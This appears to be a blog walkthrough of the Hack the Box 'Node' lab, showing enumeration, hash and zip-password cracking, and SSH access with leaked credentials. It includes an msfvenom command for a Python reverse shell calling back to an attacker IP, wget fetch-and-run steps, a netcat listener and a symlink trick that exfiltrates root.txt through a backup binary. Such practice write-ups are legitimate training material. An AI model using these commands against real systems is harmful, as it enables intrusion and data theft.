@@ -1,0 +1,237 @@
+
+								
+																		Hack the Box Challenge: Node Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on April 2, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello friends!! Today we are going to solve another CTF challenge “Node” which is available online for those who want to increase their skill in penetration testing and black box testing. Node is retired vulnerable lab presented by Hack the Box for making online penetration practices according to your experience level; they have the collection of vulnerable labs as challenges from beginners to Expert level.
+Level: Intermediate
+Task: find user.txt and root.txt file on victim’s machine.
+Since these labs are online available therefore they have static IP and IP of sense is 10.10.10.58 so let’s begin with nmap port enumeration.
+nmap -A 10.10.10.58                        
+From given below image, you can observe we found port 22 and 3000 are open in victim’s network.
+
+Knowing port 3000 is running HTTP on target machine we preferred to explore his IP our browser.
+
+We don’t find anything on the home page so we take a look at the source code of the page and go through javascripts. In one of the javascript we find a link to a page called /api/users/latest.
+
+We open /api/users and find a username and passwords in the hash.
+
+We use https://crackstation.net to decode the hashes that we found earlier.
+
+We click on login and use one the username to login with its corresponding password. When we log in we find an option to download the backup. We click on it and it downloads a file called “myplace.backup”.
+
+We try to take a look at the downloaded file and find that it is base64 encoded.
+
+We decode the backup file and find it to be a zip file.
+
+		
+		
+			
+			
+			
+			
+cat myplace.backup | base64 --decode &gt; myplace
+			
+				
+					
+				
+					1
+				
+						cat myplace.backup | base64 --decode &gt; myplace
+					
+				
+			
+		
+
+
+When we try to unzip the file it asks for a password, so we use fcrackzip to brute-force the zip file using rockyou.txt as wordlist. After brute-forcing the file we find the password; we use this password to unzip the file.
+
+		
+		
+			
+			
+			
+			
+fcrackzip -D -p /usr/share/wordlists/rockyou.txt data.zip
+			
+				
+					
+				
+					1
+				
+						fcrackzip -D -p /usr/share/wordlists/rockyou.txt data.zip
+					
+				
+			
+		
+
+
+After unzipping the file we find a file few HTML and javascript files that look like the implementation of node.js. In app.js we find the username and password hash for monogDB.
+
+We use this username and password to login through ssh into the target machine.
+
+We use wget to download the linEnum.sh file into the target machine and use it to enumerate the machine.
+
+After logging in through ssh we download linEnum.sh into the target machine to enumerate the target machine and look for privilege escalation vectors.
+
+We find 3 directories inside the home that means there may be 3 users with this name.
+
+When we take a look at the process running into the system, we find that it is running app.js as tom user.
+
+We open app.js and find the same username and password that we found earlier. It means that its backup was created using some script or program that we find earlier. Going through the file we also find this script calls for a file called backup in /usr/local/bin directory and uses a key to create a backup.
+
+Now that we know that the target machine is running mongoDB we use this to exploit the system and get a reverse shell.
+We first create a python one-liner reverse shell using msfvenom.
+
+		
+		
+			
+			
+			
+			
+msfvenom -p cmd/unix/reverse_python lhost=10.10.14.3 lport 8765 R
+			
+				
+					
+				
+					1
+				
+						msfvenom -p cmd/unix/reverse_python lhost=10.10.14.3 lport 8765 R
+					
+				
+			
+		
+
+
+We copy the python command and paste in a bash file in /var/www/html in our system. Now we use wget to download it into the target machine. We get it read, write and execute permission using chmod. We then schedule mongoDB to run the file using the username mark and the password we find in the javascript file.
+
+We then set up our listener using netcat and wait for the reverse shell. After getting the reverse shell we spawn a tty shell using python and we find that we are login as tom user. Now we go to /home/tom directory and find the user.txt; when we open the file we get our first flag.
+
+Now we create a new directory test, and we then symlink root.txt in root directory with /tmp/test. We then use backup binary to create a zip file that creates a backup for /tmp/test/ directory. As /tmp/test directory is linked to /root/root.txt it will actually create backup of the root.txt file in root directory.
+
+		
+		
+			
+			
+			
+			
+mkdir test
+ln -s /root/root.txt /tmp/test
+/usr/bin/backup -q “the key in app.js” /tmp/test
+			
+				
+					
+				
+					123
+				
+						mkdir testln -s /root/root.txt /tmp/test/usr/bin/backup -q “the key in app.js” /tmp/test
+					
+				
+			
+		
+
+
+We again go the web page and download the backup file. We decode it in the similar manner we did earlier and use the password “magicword” we found earlier to unzip the file. After unzipping the file we find root.txt when we open the file we find our final flag.
+
+Author: Sayantan Bera is a technical writer at hacking articles and cyber security enthusiast. Contact Here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
+							
+								S0Y-CUBA April 13, 2018 at 6:40 pm							
+							
+							
+														
+							
+								awesome bro!!!! Easy and well explained, nice way to do it!!!
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
